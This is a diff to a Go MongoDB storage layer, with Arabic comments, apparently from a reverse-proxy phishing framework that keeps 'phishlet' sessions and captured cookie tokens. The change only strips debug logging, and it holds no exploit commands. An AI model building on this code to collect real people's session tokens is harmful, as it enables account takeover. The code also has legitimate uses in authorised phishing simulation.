@@ -87,7 +87,6 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 	sessionsColl := db.Collection("sessions")
 	
 	// إنشاء فهرس على حقل SessionId للبحث السريع
-	log.Debug("[MongoDB] إنشاء فهرس على حقل SessionId...")
 	_, err = sessionsColl.Indexes().CreateOne(ctx, mongo.IndexModel{
 		Keys:    bson.D{{Key: "session_id", Value: 1}},
 		Options: options.Index().SetUnique(true),
@@ -97,7 +96,6 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 		client.Disconnect(ctx)
 		return nil, fmt.Errorf("فشل إنشاء الفهرس: %v", err)
 	}
-	log.Debug("[MongoDB] تم إنشاء الفهرس بنجاح")
 	
 	// عد عدد الجلسات الموجود
 	// إنشاء سياق جديد بدون مهلة للاستخدام في العمليات اللاحقة
@@ -120,10 +118,6 @@ func (m *MongoDatabase) Close() error {
 
 // convertToMongoSession يحول كائن Session التقليدي إلى كائن MongoSession
 func convertToMongoSession(s *Session) *MongoSession {
-	// طباعة البيانات قبل التحويل
-	log.Debug("[MongoDB] تحويل Session إلى MongoSession:")
-	log.Debug("[MongoDB] - Session.CountryCode: '%s'", s.CountryCode)
-	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)
 
 	// تحويل CookieTokens
 	cookieTokens := make(map[string][]map[string]interface{})
@@ -166,20 +160,14 @@ func convertToMongoSession(s *Session) *MongoSession {
 		Country:      s.Country,
 	}
 	
-	// طباعة البيانات بعد التحويل
-	log.Debug("[MongoDB] بعد التحويل:")
-	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", mongoSession.CountryCode)
-	log.Debug("[MongoDB] - MongoSession.Country: '%s'", mongoSession.Country)
+
 
 	return mongoSession
 }
 
 // convertFromMongoSession يحول كائن MongoSession إلى كائن Session التقليدي
 func convertFromMongoSession(ms *MongoSession) *Session {
-	// طباعة البيانات قبل التحويل
-	log.Debug("[MongoDB] تحويل MongoSession إلى Session:")
-	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", ms.CountryCode)
-	log.Debug("[MongoDB] - MongoSession.Country: '%s'", ms.Country)
+
 
 	// تحويل CookieTokens
 	cookieTokens := make(map[string]map[string]*CookieToken)
@@ -238,10 +226,7 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		Country:      ms.Country,
 	}
 	
-	// طباعة البيانات بعد التحويل
-	log.Debug("[MongoDB] بعد التحويل:")
-	log.Debug("[MongoDB] - Session.CountryCode: '%s'", session.CountryCode)
-	log.Debug("[MongoDB] - Session.Country: '%s'", session.Country)
+
 	
 	// إضافة البيانات للحقول المخصصة كاحتياط إضافي
 	if session.Custom == nil {
@@ -289,39 +274,31 @@ func (m *MongoDatabase) GetLastSessionId() (int, error) {
 	err := m.sessionsColl.FindOne(m.ctx, bson.D{}, opts).Decode(&session)
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
-			log.Debug("[MongoDB] لم يتم العثور على جلسات، سيتم إنشاء أول جلسة بمعرف 1")
 			return 0, nil
 		}
-		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
 		return 0, err
 	}
-	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.Id)
 	return session.Id, nil
 }
 
 // CreateSession ينشئ جلسة جديدة في MongoDB
 func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remoteAddr string) error {
-	log.Debug("[MongoDB] محاولة إنشاء جلسة جديدة: %s", sid)
 	
 	// التحقق مما إذا كانت الجلسة موجودة بالفعل
 	var existingSession MongoSession
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&existingSession)
 	if err == nil {
-		log.Debug("[MongoDB] الجلسة موجودة بالفعل: %s", sid)
 		return fmt.Errorf("الجلسة موجودة بالفعل: %s", sid)
 	} else if err != mongo.ErrNoDocuments {
-		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
 		return err
 	}
 
 	// الحصول على آخر معرف
 	lastId, err := m.GetLastSessionId()
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف: %v", err)
 		return err
 	}
 	newId := lastId + 1
-	log.Debug("[MongoDB] تعيين معرف الجلسة الجديدة: %d", newId)
 
 	// إنشاء جلسة جديدة
 	now := time.Now().UTC().Unix()
@@ -347,28 +324,23 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 
 	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء إدراج الجلسة: %v", err)
 		return err
 	}
 	
-	log.Debug("[MongoDB] تم إنشاء الجلسة بنجاح: %s (ID: %d)", sid, newId)
 	return nil
 }
 
 // ListSessions يجلب قائمة الجلسات من MongoDB
 func (m *MongoDatabase) ListSessions() ([]*Session, error) {
-	log.Debug("[MongoDB] جلب قائمة جميع الجلسات")
 	
 	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسات: %v", err)
 		return nil, err
 	}
 	defer cursor.Close(m.ctx)
 
 	var mongoSessions []MongoSession
 	if err := cursor.All(m.ctx, &mongoSessions); err != nil {
-		log.Error("[MongoDB] خطأ أثناء فك ترميز الجلسات: %v", err)
 		return nil, err
 	}
 
@@ -396,7 +368,6 @@ func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
 
 // GetSessionBySid يجلب جلسة من MongoDB باستخدام معرف الجلسة
 func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
-	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
 	
 	// تحقق من البيانات المخزنة فعلياً في MongoDB
 	m.ShowSessionDataInMongoDB(sid)
@@ -405,53 +376,25 @@ func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
-			log.Debug("[MongoDB] الجلسة غير موجودة: %s", sid)
 			return nil, fmt.Errorf("الجلسة غير موجودة: %s", sid)
 		}
-		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
 		return nil, err
 	}
 	
-	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.Id)
-	
-	// عرض وطباعة المعلومات المهمة
-	log.Success("[MongoDB] معلومات البلد المستردة من MongoDB: رمز البلد: '%s'، البلد: '%s'", 
-		mongoSession.CountryCode, mongoSession.Country)
+
 	
 	return convertFromMongoSession(&mongoSession), nil
 }
 
 // ShowSessionDataInMongoDB يُظهر البيانات الخام للجلسة من قاعدة البيانات
 func (m *MongoDatabase) ShowSessionDataInMongoDB(sid string) {
-	log.Debug("[MongoDB] استعراض البيانات الخام للجلسة: %s", sid)
 	
 	var rawDocument bson.M
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&rawDocument)
 	if err != nil {
-		log.Error("[MongoDB] فشل استرداد البيانات الخام: %v", err)
-		return
+			return
 	}
 	
-	// طباعة الحقول المهمة
-	log.Debug("[MongoDB] البيانات الخام من MongoDB:")
-	log.Debug("[MongoDB] - _id: %v", rawDocument["_id"])
-	log.Debug("[MongoDB] - session_id: %v", rawDocument["session_id"])
-	log.Debug("[MongoDB] - id: %v", rawDocument["id"])
-	log.Debug("[MongoDB] - country_code: '%v' (نوع: %T)", rawDocument["country_code"], rawDocument["country_code"])
-	log.Debug("[MongoDB] - country: '%v' (نوع: %T)", rawDocument["country"], rawDocument["country"])
-	
-	// البيانات الاختبارية
-	log.Debug("[MongoDB] - test_country: '%v'", rawDocument["test_country"])
-	log.Debug("[MongoDB] - test_code: '%v'", rawDocument["test_code"])
-	log.Debug("[MongoDB] - direct_update: '%v'", rawDocument["direct_update"])
-	log.Debug("[MongoDB] - country_code_raw: '%v'", rawDocument["country_code_raw"])
-	log.Debug("[MongoDB] - country_raw: '%v'", rawDocument["country_raw"])
-	
-	// البيانات من الحقول المخصصة
-	if customData, ok := rawDocument["custom"].(map[string]interface{}); ok {
-		log.Debug("[MongoDB] - custom.country_code_custom: '%v'", customData["country_code_custom"])
-		log.Debug("[MongoDB] - custom.country_custom: '%v'", customData["country_custom"])
-	}
 }
 
 // UpdateSession يحدث جلسة في MongoDB
